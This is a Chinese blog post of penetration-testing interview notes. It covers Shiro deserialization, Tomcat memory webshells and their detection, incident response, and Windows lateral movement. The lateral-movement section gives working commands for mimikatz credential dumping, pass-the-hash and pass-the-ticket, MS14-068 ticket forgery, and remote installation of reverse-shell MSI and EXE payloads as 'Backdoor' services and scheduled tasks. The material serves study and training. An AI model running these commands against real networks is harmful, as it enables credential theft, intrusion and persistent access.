title: 面试复习三
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2024-03-22 19:14:00
---
## Shiro550和721的原理区别
#### Shiro550
  Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。
在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。
  **Payload产生的过程：**
命令 => 序列化 => AES加密 => base64编码 => RememberMe Cookie值
  **反序列化过程：**
  获取rememberMe cookie ->base64 解码->AES解密（加密密钥硬编码）->反序列化（未作过滤处理）
  AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥
利用条件：知道aes加密的key且目标服务器含有可利用的攻击链。

#### Shiro721
  由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。
  **利用条件：**
知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。

## 内网中抓hash的工具
##### Getpass 、wce、 mimikatz 、pwdump7，8

## 应急响应流程
#### 收集信息
  收集客户信息和中毒主机信息，包括样本
#### 判断攻击类型
  Webshell、勒索、挖矿、断网、DoS等
#### 深入分析
  日志分析、进程分析、启动项分析、样本分析
##### Windows
  近期活动、排查webshell、进程分析、配置文件、操作日志
##### Linux
  特殊权限、可疑连接、/tmp/user/bin目录、进程、计划任务

## XXE的检测
  **特征：**
- 特征1 --- .ashx，看到url是 .ashx后缀的
- 特征2 --- 响应体是xml


## Tomcat实现内存马的方式
#### Servlet-API型
  通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如tomcat的valve内存马
- filter型
- servlet型
- listener型

#### 字节码增强型
  通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。
#### 分类
##### spring类
- 拦截器
- Controller型

##### Tomcat filter型内存马
  所谓filter内存马，就是在web容器中创建了含有恶意代码的filter，在请求传递到servlet前被拦截下来且执行了恶意代码。

##### Tomcat servlet型内存马
  servlet型的内存马原理就是注册一个恶意的servlet，与filter相似，只是创建过程不同。
  核心还是看StandardContext，在init filter后就调用了loadOnStartup方法实例化servlet
  可以发现servlet的相关信息是保存在StandardContext的children字段。

##### Tomcat listener型内存马
  listener用于监听时间的发生或状态的改变，其初始化与调用顺序在filter之前。
  listener选择很多。我们选择与request相关的ServletRequestListener。
  Tomcat使用两类Listener接口分别是org.apache.catalina.LifecycleListener和原生Java.util.EventListener。
  一般作为webshell，需要对网站发送请求使用Java.util.EventListener。

#### 查杀思路
- 利用Java Agent遍历加载到内存中的Class
- 先判断是否是内存马，是则进入内存查杀。

#### 特征判断
- 根据shell或者随机数关键字
- 根据 Filter 优先级；为了使权限最大化，保证在各种情况下都可以访问，需要把优先级调到最高
- 根据特殊的classloader（类加载器）、 Filter 对应的ClassLoader目录进行检测； Filter 也是一种Class，必定需要特定的classloader（类加载器）
- 把内存中class导出，反编译之后查看是否存在恶意代码；如调用的了一些特殊的方法
  - java.lang.Runtime.getRuntime
  - defineClass
  - invoke

## 内网横向方法
  **攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。**
  <a href="https://smms.app/image/WSPdBCXrzvtZj3G" target="_blank"><img src="https://s2.loli.net/2024/03/23/WSPdBCXrzvtZj3G.png" ></a>
#### IPC横向
  执行`net share`命令，可以获得Windows默认开启的网络共享，其中C$为C盘共享，ADMIN$为系统目录共享，还有一个IPC$共享。
  IPC是共享”命令管道”的资源，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。
  通过IPC$连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或服务等。
  **建立IPC$连接需要具备以下两个条件：**
    ①远程主机开启了IPC连接
    ②远程主机的139端口和445端口开放
```
# IPC$ 连接
net use \\ip\ipc$                     # 建立空连接
net use \\ip\ipc$ "password" /user:"Administrator"   # 建立非空连接

# IPC$ 使用
net use                               # 查看本机建立的连接(本机连接其他机器)
net session                           # 查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行
net share                             # 查看本地开启的共享
net share ipc$                        # 开启ipc$共享
net share ipc$ /del                   # 删除ipc$共享
net share admin$ /del                 # 删除admin$共享
net share c$ /del                     # 删除C盘共享
net use * /del                        # 删除所有连接

# IPC$ 连接建立之后的操作
dir \\ip\c$                              # 列出目标文件目录
copy C:\\Users\Administrator\Desktop\whatever.exe \\ip\c$\aaa # 将文件复制到目标C盘aaa目录下
type \\ip\c$\1.txt                       # 查看目标C盘下1.txt文件内容
net use h: \\ip\c$                       # 磁盘映射，将目标的 C 盘映射到本地的 H 盘
net use h: /del                          # 删除磁盘映射
```

#### 远程桌面协议横向
##### 利用远程桌面协议（RDP）
  ① 查询注册表确定是否主机开启了远程桌面
```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 
ps: 若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP
```
  ② 开启远程桌面
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
```
  ③ 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） 
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0  
```
  ④ 设置防火墙策略放行3389端口 
```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

##### RDP Hijack
  Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。
  可以通过`query user`来列出所有登录的用户列表，得到id
  在SYSTEM权限下，使用`tscon <ID>`来切换用户不需要验证密码。

##### [sharp RDP](https://github.com/0xthirteen/SharpRDP)
  sharp rdp可以通过远程桌面协议在远程主机上执行系统命令，且不需要GUI客户端。
  工具需要远程主机开启远程桌面功能，且防火墙放行3389端口

##### WMI横向
  WMI（Windows管理规范）是一项核心的Windows管理技术。用户可以通过WMI管理本地和远程主机。
  Windows为传输WMI数据提供了两个可用的协议：分布式组件对象模型（DCOM）和Windows远程管理（WinRM）使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能远程运行。
  **目前两种常见的利用方法：**
1. 通过调用WMI的类方法进行远程调用，如Win32_Process类中的Create方法可以在远程主机上创建进程，Win32_Product类的Install方法可以在远程主机上安装恶意的MSI
2. 远程部署WMI事件订阅，在特定事件发生时触发
  **利用WMI进行横向移动需要具备以下条件：**
1. 远程主机的WMI服务为开启状态（默认开启）
2. 远程主机防火墙放行135端口，这是WMI管理的默认端口
  **利用步骤：**
1. 通过WMI查询远程主机上运行的进程信息
```
wmic /node:192.168.1.131 /user:Administrator /password:123456@ process list brief # /node 执行远程主机的地址
```
2. 创建远程进程
通过调用Win32_Process.Create方法在远程主机上创建进程，启动CMD来执行命令
由于WMIC在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件
```
wmic /node:192.168.1.131 /user:Administrator /password:123456@ process call create "cmd.exe /c ipconfig > C:\result.txt"
```
3. 远程安装MSI文件
通过调用Win32_Product.Install方法，可以控制远程主机安装恶意MSI文件，从而获得权限
```
wmic /node:192.168.1.131 /user:Administrator /password:123456@ product call install PackageLocation="\\192.168.1.1\mysmb\reverse_tcp.msi"
```

#### SMB横向
  SMB（服务器消息块），又称CIFS（网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。
  客户端与服务器建立连接后,客户端可以向服务器发送SMB命令允许用户访问共享、打开、读取或者是写入文件。
  SMB消息一般使用NetBIOS协议或TCP发送，分别使用端口139或445，目前倾向于使用445端口。
  **利用条件；**
1. 445端口开放
2. 知道账号密码
  **利用步骤：**
1. 建立IPC链接，psexec 需要明文或 hash 传递
```
net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator
psexec \\192.168.3.32 -s cmd       //需要先有 ipc 链接 -s 以 System 权限运行
```
2. 或者不用建立 IPC 直接提供明文账户密码
```
psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd
```

#### 密码喷洒
密码喷洒使用常见密码列表来访问一个域上的多个帐户。
撞库则是使用一组凭据来尝试访问多个域中的不同帐户。
**利用metasploit进行密码喷洒实质上还是弱口令攻击**
以上是知道账密的情况下横向

#### PTH-哈希传递(pass the hash)
  **利用 LM 或 NTLM 的值进行的渗透测试**
##### 在工作组环境中：
  Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
  Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问
##### 在域环境中：
  只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器
  如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1
##### 攻击原理
  原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。
  如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。
  安装补丁后可以使用 AES keys 代替 NT hash 来实现 ptk 攻击
##### 攻击流程
1. 用mimikatz抓取NTLM Hash：
```
privilege::debug
sekurlsa::msv
sekurlsa::ekeys
sekurlsa::logonpasswords
```
2. 用mimikatz将获取的Administrator的Hash添加进lsass中
```
privilege::debug
sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值 hash
```
3. 弹出shell访问远程主机或服务
```
net use \\192.168.52.138	   #建立IPC连接
dir \\192.168.52.138\c$		#查看连接域内ip的c盘文件夹
```

#### PTK-aes256传递(pass the key)
  **利用的 ekeys aes256 进行的渗透测试**
  系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash也就失去了作用，但是可以通过pass the key的攻击方式获得权限。
  该攻击方法需要获取用户的aes key
  打补丁前不能连接，打补丁后才能任意用户都可以采用 aes256 连接
##### 攻击流程
  与PTH相同
##### 利用Mimikatz进行PTH
  mimikatz进行哈希传递需要本地管理员权限。


#### PTT-票据传递（ms14-068-pass the ticket）
  **利用的票据凭证 TGT 进行的渗透测试**
  不需要管理员权限就可以获得远程系统的访问权限，Pass The Ticket 票据传递（PTT攻击）实现**【未授权访问】**。
  PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，三种常见的攻击方法：
  `MS14-068`，`Golden ticket`，`SILVER ticket`。
  因为当前主机之前肯定与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据、利用。该方法类似于cookie欺骗。
  票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用了。
  简单来说就是将连接合法的票据注入到内存中实现连接。
  Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。
  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。
  <a href="https://smms.app/image/Ozy9pLr7JWviUah" target="_blank"><img src="https://s2.loli.net/2024/03/23/Ozy9pLr7JWviUah.png" ></a>
##### 攻击流程
  ① 抓取用户的哈希
```
sekurlsa::logonpasswords full
sekurlsa::tickets /export
```
  ② 删除票据，排除干扰
```
klist purge
```
  ③ 利用抓取的域管理员的NTLM hash进行哈希传递
```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:abcde.com /ntlm:哈希值" exit
kerberos::ptt 票据文件
```

#### [MS14-068](https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068)攻击
  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。
  Windows域中使用kerberos协议过程中，为了让服务器判断Client是否有权限访问服务，微软在Windows平台上在Kerberos协议中增加了PAC（Privilege Attribute Certificate）特权属性证书，也就是这个PAC造成了MS14-068这个漏洞。
  PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。
  漏洞允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意的PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。
##### 漏洞利用条件：
  1. 域内任意用户SID
  2. 域内任意用户密码
##### 攻击流程：
  1. 获得一个域用户douser的SID
```
whoami /all
```
  2. 上传工具ms14-068.exe，并执行命令生成TGT票据
```
ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码
```
  3. 上传mimikatz，利用mimikatz将票据注入到当前内存中伪造凭证
```
mimikatz # kerberos::purge          //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz # kerberos::list           //查看当前机器凭证
mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中
```
  4. 使用net use进行登录或者使用psexec，wmi等方法进行远程执行命令
```
net use \\WIN-ENS2VR5TR3N           //登录域控
```
  5. 上传一个正向的msf马，并将该木马copy到域控上去执行
```
copy c:\windows\system32\shell.exe \\WIN-ENS2VR5TR3N\c$
```
  6. 通过sc远程对域控创建服务来启动木马
```
sc \\WIN-ENS2VR5TR3N create bindshell binpath= "c:\shell.exe"
sc \\WIN-ENS2VR5TR3N start bindshell
```

#### kerberoast攻击
  攻击者从 TGS-REP 中提取加密的服务票证。
  由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。

#### WinRM横向
  **Windows远程管理提供了两个工具：**
① Winrs，允许远程执行命令的命令行工具，利用了WS-Manage协议
② Winrm（Winrm.cmd)，内置系统管理命令行工具，允许管理员配置本机的WinRM服务。
  WinRM是通过执行WS-Management协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的Windows计算机彼此之间互相访问和交换信息，对应的端口是5985。
  在一台计算机启用WinRM服务后，防火墙会自动放行其相关通信端口，在另一台计算机便能通过WinRM对其进行远程管理了。
  在利用WinRM进行横向移动时，需要拥有远程主机的管理员凭据信息。
  在默认情况下，无法通过WinRM连接到目标系统。可能出现错误：Winrs error：WinRM客户端无法处理该请求。
**可以将默认身份验证与IP地址结合使用：**
  ① 传输为HTTPS或目标位于TrustedHosts列表中，并且提供显式凭据
  ② 使用Winrm.cmd配置TrustedHosts
  ③ 将目标地址添加到TrustedHosts中
```
winrm set winrm/config/client @{TrustedHosts="192.168.1.1"} 
set-Item WSMan:localhost\client\trustedhosts -value *    
# 通过powershell，信任所有主机
```
  ④ 使用Winrs或者WinRM执行命令
```
【Winrs】
# 执行系统命令 
winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123456@ "whoami" 
# 获取远程交互式命令行 
winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123456@ "cmd"
【WinRM】
winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @{commandline="notepad.exe"} -r:http://192.168.1.131:5985 -u:Administrator -p:123456@
```

#### AT & schtasks 计划任务横向
  **利用思路：**
获取到某域主机权限
->minikatz 得到密码（明文，hash）
->用到信息收集里面域用户的列表当做用户名字典
->用到密码明文当做密码字典
->尝试连接
->创建计划任务(at|schtasks)
->执行文件可为后门或者相关命令

  **AT利用流程：**
① 建立 IPC 链接到目标主机
② 拷贝要执行的命令脚本到目标主机
```
copy hack.bat \\192.168.1.131\c$\Windows\Temp
```
③ 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本
```
net time \\192.168.1.131
at \\192.168.1.131 19:48 c:\Windows\Temp\hack.bat
```
④ 删除 IPC 链接
```
at \\192.168.1.131 任务ID /delete
```
  ps: Windows Server 2012 以后的版本没有at命令，只有schtasks命令

  **schtasks利用流程：**
① 利用已建立的IPC连接上传后门程序
② 利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务shell
```
schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR C:\users\pubilc\shell.exe /RN System /F 
```
③ 等待计划任务自行执行，或者立即启动计划任务shell
```
schtasks /RUN /S 192.168.1.131 /I /TN Backdoor
```
④ 查看计划任务shell
```
schtasks /query /S 192.168.1.131 /TN Backdoo
```
⑤ 删除计划任务shell
```
schtasks /Delete /S 192.168.1.131 /TN Backdoor /F
```
  ps:在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt

#### SC创建Windows服务进行横向渗透
  ① 创建远程服务需要拥有两端主机的管理员权限（要创建服务）和IPC连接
  ② 利用已建立的共享连接向远程主机上传攻击载荷reverse_tcp.exe
  ③ 利用已建立的IPC连接在远程主机上创建系统服务shell
```
sc \\192.168.1.131 create Backdoor binpath= "cmd.exe /k c:\users\public\reverse_tcp.exe"
```
  ④ 删除服务shell
```
sc \\192.168.1.131 delete Backdoor
```
  ps:binpath的等号后面需要有一个空格

#### PsExec工具横向
  psexec 是 windows 开发的远程命令行工具。
  psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。
  目标主机开启了防火墙，psexec会提示找不到网络路径。但由于PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中。 
  如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务）
  如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。
  **基本原理：**
  通过ipc$连接，释放二进制文件psexecsvc.exe到目标
  通过服务管理SCManager远程创建一个psexec服务，并启动服务
```
psexec.exe -accepteula \\192.168.1.131 -u Administrator -p password@ -s cmd.exe 
```
  客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据
```
psexec.exe -accepteula \\192.168.1.131 -s cmd.exe
```
  运行结束后删除服务

#### DCOM远程命令攻击
  COM（组件对象模型）是微软的一套软件组成的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。
  COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其它进程中，甚至可以在远程计算机中。
  DCOM（分布式组件对象模型）是基于COM的一系列概念和程序接口，支持不同机器上的组件间通信。
  利用DCOM，客户端程序对象可以请求来自网络中另一台计算机上的服务器程序对象。
  **使用DCOM在远程主机上面执行命令，需要具有以下条件：**
1. 具有管理员权限的PowerShell
2. 可能需要关闭目标系统的防火墙。
3. 在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户
  **目前常利用的DCOM组件有：**
`MMC20.Application`、`ShellWindows`、`Excel.Application`、`ShellBrowserWindow`

#### NTLM Relay攻击
  在Windows中，NTLM hash 分为 `NTLMv1` 、`NTLMv2` 、`NTLM session v2` 三种。
  `NTLMv2` 的强度比 `NTLMv1` 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 `NTLMv2`，`NTLMv2`的密码强度高了不少，因此需要使用NTLM Relay攻击。
  NTLM Relay攻击就是要将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLM Relay。
  Net-NTLM Hash 是基于用户密码的NTLM Hash计算出来的，用于在网络环境下 NTLM 认证的 hash。为了重放这个Net-NTLMhash，首先我们要做的就是获取这个Net-NTLMhash。
  获得Net-NTLM Relay的思路可以有以下几种：
##### 利用LLMNR和NetBIOS欺骗获得Net-NTLMHash
  **Windows系统名称解析顺序为：**
- 本地hosts文件（%windir%\System32\drivers\etc\hosts）
- DNS缓存/DNS服务器
- 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）
 也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。
  这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。
  当用户输入不存在、包含错误或者DNS中没有的主机名时，通过工具(responder)监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。
  核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLMHash。
##### 利用WPAD劫持获得Net-NTLMHash
  WPAD 网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。
  WPAD通过让浏览器自动发现代理服务器，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。
  一个典型的劫持方式是利用LLMNR/NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签从而获得用户的Net-NTLMHash。
##### 具体实现方法请看此[链接](https://www.freebuf.com/articles/244375.html)

#### [mimikatz](https://github.com/ParrotSec/mimikatz)常用命令
```
privilege::debug            #提升权限
sekurlsa::logonpasswords    #抓取密码信息
sekurlsa::msv               #抓取LM、NTLM、值
sekurlsa::ekeys             #抓取aes值
```

#### 注意
  **只有IPC、WMI、SMB、密码喷洒是知道账密的情况下横向，不知道密码请使用其它方法。**
  **psexec工具合法，监测到会告警，但是释放文件会被杀。**
  **smbexec为impacket工具中的工具，操作简单，容易被杀，使用时无需先进行IPC连接**
  
## 后记
  **内网渗透的内容难度确实很高，到这里感觉工具的使用不再重要，更重要的是思路。**